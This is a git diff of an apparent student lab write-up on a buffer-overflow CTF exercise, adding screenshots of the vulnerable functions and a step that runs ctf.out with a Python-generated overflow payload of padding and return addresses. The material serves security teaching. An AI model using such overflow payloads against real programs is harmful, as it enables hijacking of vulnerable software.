@@ -116,8 +116,12 @@ The Dockerfile is used to build docker image with full required packages for Han
 `Seclabs` is created inside student's home folder
 
 ### Visualize the initial attack idea
-
+Function: vuln and main
 ![image](https://github.com/user-attachments/assets/9c37ba1d-1c92-48e9-9256-af83e1bf88c1)
+
+Function: myFunc
+![image](https://github.com/user-attachments/assets/040e1510-9bf6-4c84-b0a0-2fc1b60d0341)
+
 
 ### Conducting the attack
 1. After creating the seclabs folder, continue to create a folder named bof in seclabs <br>
@@ -138,6 +142,11 @@ The Dockerfile is used to build docker image with full required packages for Han
 ![image](https://github.com/user-attachments/assets/7e128f35-fce5-40b9-a216-8648424b1849)
 9. Create file flag1.txt <br>
 ![image](https://github.com/user-attachments/assets/563fd6da-3ba2-4729-8f73-4bbc74a31a21)
+10. Conducting attack <br>
+`$>./ctf.out $(python -c "print(104*'a' + '\x1b\x85\x04\x08' + 4*'a' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`
+![image](https://github.com/user-attachments/assets/bf331aa5-c5b0-4b53-a123-8dbe194a376f)
+
+
 
 
 
